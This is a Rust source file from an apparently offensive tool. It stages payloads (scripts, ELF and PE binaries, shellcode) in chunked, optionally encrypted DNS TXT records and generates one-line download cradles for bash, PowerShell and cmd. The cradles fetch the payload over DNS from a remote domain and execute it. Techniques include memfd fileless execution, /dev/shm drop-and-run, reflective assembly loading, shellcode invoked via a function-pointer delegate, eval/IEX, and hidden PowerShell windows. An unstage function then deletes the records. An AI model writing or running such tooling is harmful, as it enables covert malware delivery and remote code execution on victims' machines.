use crate::dns::{DnsBackend, DnsError};
use base64::Engine;
use serde::{Deserialize, Serialize};
use thiserror::Error;

const MAX_CHUNK_B64: usize = 1800;
const MAX_CHUNK_RAW: usize = MAX_CHUNK_B64 * 3 / 4;
const RECORD_TTL: u32 = 60;

#[derive(Error, Debug)]
pub enum CradleError {
    #[error("DNS error: {0}")]
    Dns(#[from] DnsError),
    #[error("payload too small ({0} bytes)")]
    EmptyPayload(usize),
    #[error("metadata not found for label '{0}'")]
    MetaNotFound(String),
    #[error("metadata parse error: {0}")]
    MetaParse(String),
    #[error("crypto error: {0}")]
    Crypto(String),
    #[error("{0}")]
    Other(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PayloadType {
    Script,
    Elf,
    Pe,
    Shellcode,
}

impl PayloadType {
    pub fn detect(data: &[u8]) -> Self {
        if data.len() >= 4 && &data[..4] == b"\x7fELF" {
            PayloadType::Elf
        } else if data.len() >= 2 && &data[..2] == b"MZ" {
            PayloadType::Pe
        } else {
            PayloadType::Script
        }
    }
}

impl std::fmt::Display for PayloadType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PayloadType::Script => write!(f, "script"),
            PayloadType::Elf => write!(f, "elf"),
            PayloadType::Pe => write!(f, "pe"),
            PayloadType::Shellcode => write!(f, "shellcode"),
        }
    }
}

impl std::str::FromStr for PayloadType {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "script" => Ok(PayloadType::Script),
            "elf" => Ok(PayloadType::Elf),
            "pe" => Ok(PayloadType::Pe),
            "shellcode" | "sc" => Ok(PayloadType::Shellcode),
            _ => Err(format!("unknown payload type: {s}")),
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct StageMeta {
    pub chunks: usize,
    pub size: usize,
    #[serde(rename = "type")]
    pub payload_type: PayloadType,
    pub hash: String,
    /// Whether the staged payload is encrypted (ChaCha20-Poly1305)
    #[serde(default)]
    pub encrypted: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Shell {
    Bash,
    Pwsh,
    Cmd,
}

impl std::fmt::Display for Shell {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Shell::Bash => write!(f, "bash"),
            Shell::Pwsh => write!(f, "pwsh"),
            Shell::Cmd => write!(f, "cmd"),
        }
    }
}

impl std::str::FromStr for Shell {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "bash" | "sh" => Ok(Shell::Bash),
            "pwsh" | "powershell" | "ps" | "ps1" => Ok(Shell::Pwsh),
            "cmd" => Ok(Shell::Cmd),
            _ => Err(format!("unknown shell: {s} (try: bash, pwsh, cmd)")),
        }
    }
}

fn meta_record_name(label: &str, domain: &str) -> String {
    format!("_s.meta.{label}.{domain}")
}

fn chunk_record_name(index: usize, label: &str, domain: &str) -> String {
    format!("_s.{index}.{label}.{domain}")
}

fn record_prefix(label: &str, domain: &str) -> String {
    format!("_s.{label}.{domain}")
}

/// Stage a payload into DNS TXT records.
///
/// By default, records are plain base64 (for native-tool cradle compatibility).
/// If `encrypt` is true, the payload is encrypted with ChaCha20-Poly1305 before
/// base64 encoding — cradles will need the key to decode.
pub async fn stage_payload(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
    data: &[u8],
    payload_type: Option<PayloadType>,
    encrypt: bool,
    encryption_key: Option<&crate::crypto::EncryptionKey>,
) -> Result<StageMeta, CradleError> {
    if data.is_empty() {
        return Err(CradleError::EmptyPayload(0));
    }

    let ptype = payload_type.unwrap_or_else(|| PayloadType::detect(data));
    let hash = blake3::hash(data).to_hex()[..32].to_string();

    // Optionally encrypt the payload
    let staged_data = if encrypt {
        let key = encryption_key.ok_or_else(|| {
            CradleError::Crypto("encryption requested but no key provided".to_string())
        })?;
        crate::crypto::encrypt(key, data)
            .map_err(|e| CradleError::Crypto(e.to_string()))?
    } else {
        data.to_vec()
    };

    let chunks: Vec<String> = staged_data
        .chunks(MAX_CHUNK_RAW)
        .map(|chunk| base64::engine::general_purpose::STANDARD.encode(chunk))
        .collect();

    let meta = StageMeta {
        chunks: chunks.len(),
        size: data.len(),
        payload_type: ptype,
        hash,
        encrypted: encrypt,
    };

    let meta_name = meta_record_name(label, domain);
    let meta_json =
        serde_json::to_string(&meta).map_err(|e| CradleError::Other(e.to_string()))?;
    backend
        .create_record(&meta_name, &meta_json, RECORD_TTL)
        .await?;

    let mut batch: Vec<(String, String)> = Vec::with_capacity(chunks.len());
    for (i, encoded) in chunks.iter().enumerate() {
        batch.push((chunk_record_name(i, label, domain), encoded.clone()));
    }
    let batch_refs: Vec<(&str, &str, u32)> = batch
        .iter()
        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL))
        .collect();
    backend.batch_create(batch_refs).await?;

    Ok(meta)
}

pub async fn read_stage_meta(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
) -> Result<StageMeta, CradleError> {
    let name = meta_record_name(label, domain);
    let records = backend.get_records(&name).await?;
    let record = records
        .first()
        .ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
    let meta: StageMeta = serde_json::from_str(&record.content)
        .map_err(|e| CradleError::MetaParse(e.to_string()))?;
    Ok(meta)
}

pub async fn unstage_payload(
    backend: &dyn DnsBackend,
    domain: &str,
    label: &str,
) -> Result<usize, CradleError> {
    let prefix = record_prefix(label, domain);
    let meta_name = meta_record_name(label, domain);
    let mut deleted = 0;

    let meta_records = backend.get_records(&meta_name).await?;
    for r in &meta_records {
        if let Some(id) = &r.id {
            backend.delete_record(id).await?;
            deleted += 1;
        }
    }

    let all_records = backend.list_records(&prefix).await?;
    for r in &all_records {
        if let Some(id) = &r.id {
            backend.delete_record(id).await?;
            deleted += 1;
        }
    }

    Ok(deleted)
}

pub fn generate_cradle(
    shell: Shell,
    domain: &str,
    label: &str,
    meta: &StageMeta,
    ns_server: Option<&str>,
) -> String {
    let n = meta.chunks - 1;
    let is_binary = matches!(
        meta.payload_type,
        PayloadType::Elf | PayloadType::Pe | PayloadType::Shellcode
    );
    match shell {
        Shell::Bash => gen_bash(domain, label, n, is_binary, ns_server),
        Shell::Pwsh => gen_pwsh(domain, label, n, is_binary, meta.payload_type, ns_server),
        Shell::Cmd => gen_cmd(domain, label, n, is_binary, meta.payload_type, ns_server),
    }
}

fn gen_bash(
    domain: &str,
    label: &str,
    max_idx: usize,
    is_binary: bool,
    ns: Option<&str>,
) -> String {
    let ns = ns.map(|s| format!(" @{s}")).unwrap_or_default();
    let fetch = format!(
        "for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done"
    );

    if is_binary {
        let memfd = format!(
            "python3 -c \"import ctypes,base64,os;b=base64.b64decode('$({fetch})');\
             fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
             os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\""
        );
        let shm = format!(
            "{fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x"
        );
        format!("# Fileless (python3):\n{memfd}\n\n# /dev/shm fallback:\n{shm}")
    } else {
        format!("eval \"$({fetch}|base64 -d)\"")
    }
}

fn gen_pwsh(
    domain: &str,
    label: &str,
    max_idx: usize,
    is_binary: bool,
    ptype: PayloadType,
    ns: Option<&str>,
) -> String {
    let ns_p = ns.map(|s| format!(" -Se {s}")).unwrap_or_default();
    let fetch = format!(
        "-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_p}).Strings}})"
    );

    if is_binary {
        match ptype {
            PayloadType::Pe => format!(
                "$b=[Convert]::FromBase64String({fetch});\
                 [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
            ),
            PayloadType::Shellcode => format!(
                "$b=[Convert]::FromBase64String({fetch});\
                 $m=[Runtime.InteropServices.Marshal];\
                 $p=$m::AllocHGlobal($b.Length);\
                 $m::Copy($b,0,$p,$b.Length);\
                 $d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Action]);\
                 $d.Invoke()"
            ),
            _ => format!(
                "$b=[Convert]::FromBase64String({fetch});\
                 $f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);\
                 chmod +x $f;Start-Process $f -Wait;rm $f"
            ),
        }
    } else {
        format!("IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({fetch})))")
    }
}

fn gen_cmd(
    domain: &str,
    label: &str,
    max_idx: usize,
    is_binary: bool,
    ptype: PayloadType,
    ns: Option<&str>,
) -> String {
    let inner = gen_pwsh(domain, label, max_idx, is_binary, ptype, ns);
    let escaped = inner.replace('"', "\\\"");
    format!("powershell -nop -w hidden -c \"{escaped}\"")
}
